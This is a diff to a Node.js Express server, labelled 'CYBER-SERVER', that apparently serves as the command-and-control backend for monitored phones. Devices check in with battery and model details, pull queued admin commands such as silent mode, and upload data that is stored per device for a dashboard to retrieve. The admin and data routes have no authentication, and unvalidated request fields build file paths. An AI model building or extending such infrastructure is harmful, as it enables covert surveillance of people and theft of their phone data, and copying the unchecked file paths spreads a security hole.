@@ -17,7 +17,6 @@ app.use(bodyParser.json({ limit: '50mb' }));
 app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
 app.use(express.static(__dirname));
 
-// Live memory devices ka status rakhne ke liye
 let devicesStatus = {}; 
 
 // ==================================================
@@ -26,15 +25,17 @@ let devicesStatus = {};
 
 app.post('/api/status', (req, res) => {
     let { device_id, model, battery, version, charging } = req.body; 
-    if (!device_id) return res.status(400).json({ error: "No Device ID" });
+    if (!device_id) {
+        console.log("⚠️ REJECTED: Ping received without Device ID");
+        return res.status(400).json({ error: "No Device ID" });
+    }
 
-    // ID hamesha uppercase rakho taaki mismatch na ho
     device_id = device_id.toUpperCase();
 
     // Check if there is a pending command
     const pendingCommand = (devicesStatus[device_id] && devicesStatus[device_id].command) ? devicesStatus[device_id].command : "none";
 
-    // Device status update karo memory mein
+    // Update status
     devicesStatus[device_id] = {
         id: device_id,
         model: model || "Unknown Device",
@@ -42,10 +43,16 @@ app.post('/api/status', (req, res) => {
         version: version || "--",
         charging: (charging === 'true' || charging === true),
         lastSeen: Date.now(),
-        command: "none" // Command nikalte hi memory se reset
+        command: "none" 
     };
 
-    console.log(`📡 Ping: ${model} [${device_id}] | Bat: ${battery}% | Cmd: ${pendingCommand}`);
+    // DEBUG LOG
+    console.log(`-------------------------------------------`);
+    console.log(`📡 PING RECEIVED | ID: ${device_id} | Model: ${model}`);
+    console.log(`🔋 Battery: ${battery}% | Charging: ${charging}`);
+    console.log(`✉️ Command Sent to Phone: ${pendingCommand}`);
+    console.log(`-------------------------------------------`);
+
     res.json({ status: "success", command: pendingCommand });
 });
 
@@ -54,8 +61,24 @@ app.post('/api/upload_data', (req, res) => {
     if (!device_id) return res.status(400).json({ error: "No ID" });
     
     device_id = device_id.toUpperCase();
+    console.log(`📥 UPLOAD ATTEMPT | ID: ${device_id} | Type: ${type}`);
 
-    let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
+    let parsedData;
+    try {
+        parsedData = typeof data === 'string' ? JSON.parse(data) : data;
+        
+        // CHECK: Kya data khali toh nahi?
+        if (!parsedData || (Array.isArray(parsedData) && parsedData.length === 0)) {
+            console.log(`⚠️ WARNING: [${device_id}] ne [${type}] bhej toh diya, par DATA KHALI (Empty) hai!`);
+        } else {
+            const count = Array.isArray(parsedData) ? parsedData.length : "1 Object";
+            console.log(`✅ SUCCESS: [${device_id}] received ${count} entries for ${type}`);
+        }
+    } catch (e) {
+        console.log(`❌ ERROR: [${device_id}] ne invalid data bheja. Parse nahi ho raha.`);
+        return res.status(400).json({ error: "Invalid JSON" });
+    }
+
     const filePath = path.join(UPLOADS_DIR, `${device_id}_${type}.json`);
 
     try {
@@ -83,10 +106,9 @@ app.post('/api/upload_data', (req, res) => {
         }
 
         fs.writeFileSync(filePath, JSON.stringify(finalData, null, 2));
-        console.log(`📥 Saved ${type} for: ${device_id}`);
         res.json({ status: "success" });
     } catch (error) {
-        console.error("Save Error:", error);
+        console.error(`❌ FILE SAVE ERROR [${device_id}]:`, error);
         res.status(500).json({ status: "error" });
     }
 });
@@ -95,41 +117,32 @@ app.post('/api/upload_data', (req, res) => {
 // 💻 DASHBOARD SIDE (Admin Side)
 // ==================================================
 
-// Specific Device Status (Fix: Memory check + Folder scan)
-app.get('/api/device-status/:id', (req, res) => {
-    const devId = req.params.id.toUpperCase();
-    let device = devicesStatus[devId];
+app.post('/api/send-command', (req, res) => {
+    let { device_id, command } = req.body;
+    if(!device_id) return res.status(400).json({error: "ID required"});
     
-    // Agar memory mein nahi hai (server restart), toh offline return karo
-    if (!device) {
-        return res.json({ 
-            id: devId,
-            model: "Device Offline",
-            isOnline: false,
-            battery: "--",
-            command: "none"
-        });
-    }
+    device_id = device_id.toUpperCase();
 
-    const isOnline = (Date.now() - device.lastSeen) < 60000; 
-    res.json({ 
-        ...device, 
-        isOnline 
-    });
+    if (!devicesStatus[device_id]) {
+        devicesStatus[device_id] = { id: device_id, model: "Unknown", lastSeen: 0 };
+    }
+    
+    devicesStatus[device_id].command = command;
+    console.log(`🚀 ADMIN COMMAND QUEUED | Target: ${device_id} | Cmd: ${command}`);
+    res.json({ status: "success", queuedCommand: command });
 });
 
-// Saare Devices ki list
+// Baaki routes (all-devices aur get-data) wahi rahenge
 app.get('/api/admin/all-devices', (req, res) => {
     const files = fs.readdirSync(UPLOADS_DIR);
     let deviceList = {};
-
     files.forEach(file => {
         const deviceId = file.split('_')[0].toUpperCase();
         if (!deviceList[deviceId]) {
             const isOnline = devicesStatus[deviceId] ? (Date.now() - devicesStatus[deviceId].lastSeen < 60000) : false;
             deviceList[deviceId] = {
                 id: deviceId,
-                model: devicesStatus[deviceId]?.model || "Unknown Device",
+                model: devicesStatus[deviceId]?.model || "Offline",
                 isOnline: isOnline,
                 battery: devicesStatus[deviceId]?.battery || "--"
             };
@@ -138,35 +151,15 @@ app.get('/api/admin/all-devices', (req, res) => {
     res.json(deviceList);
 });
 
-// Specific Data Fetch
 app.get('/api/get-data/:device_id/:type', (req, res) => {
     const devId = req.params.device_id.toUpperCase();
     const type = req.params.type;
     const filePath = path.join(UPLOADS_DIR, `${devId}_${type}.json`);
-
-    if (fs.existsSync(filePath)) {
-        res.sendFile(filePath);
-    } else {
-        res.json([]); 
-    }
-});
-
-// Command Bhejna (Silent/Normal etc)
-app.post('/api/send-command', (req, res) => {
-    let { device_id, command } = req.body;
-    if(!device_id) return res.status(400).json({error: "ID required"});
-    
-    device_id = device_id.toUpperCase();
-
-    if (!devicesStatus[device_id]) {
-        devicesStatus[device_id] = { id: device_id, model: "Connecting..." };
-    }
-    
-    devicesStatus[device_id].command = command;
-    console.log(`🚀 Command [${command}] queued for -> ${device_id}`);
-    res.json({ status: "success", queuedCommand: command });
+    if (fs.existsSync(filePath)) res.sendFile(filePath);
+    else res.json([]);
 });
 
 app.listen(PORT, () => {
     console.log(`🔥 CYBER-SERVER RUNNING ON PORT ${PORT}`);
+    console.log(`📂 Storage Path: ${UPLOADS_DIR}`);
 });
